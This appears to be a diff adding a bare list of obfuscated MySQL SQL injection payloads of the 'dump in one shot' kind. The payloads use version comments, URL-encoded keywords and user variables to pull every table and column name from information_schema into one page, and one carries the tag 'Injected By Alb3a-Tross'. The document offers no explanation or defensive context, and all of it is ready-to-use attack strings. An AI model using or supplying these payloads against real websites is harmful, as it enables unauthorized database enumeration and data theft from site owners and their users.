@@ -1,0 +1,22 @@
++AND+MOD(52,12)+div@x:=(select(@x)%66rom(select(@x:=0x00),(select(@x)%66rom(/*!50000information_schema.columns*/)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@x)in(@x:=concat/**alibro**/(@x,0x3C62723E,/*!50000table_name*/,0x3a,/*!50000column_name*/))))a)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/+
+
+
+@x
+
+
+
+Dios:-2
+
+
+and+mod(1,1)+or@s:=(/*!50000select*/+group_concat('<br>',table_name,' ::: ',column_name)+/*!50000from*/+/*!50000information_schema*/.columns+where+table_schema=database/**x**/())/*!50000%55nion*/+/*!50000%73elect*/
+
+
+@s
+
+
+
+
++and+mod(1,1)+or@s:=(/*!50000select*/+group_concat('<br>','Injected By Alb3a-Tross','</br>','<br>',table_name,' ::: ',column_name)+/*!50000from*/+/*!50000information_schema*/.columns+where+table_schema=database/**x**/())/*!50000%55nion*/+/*!50000%73elect*/
+
+
+@s
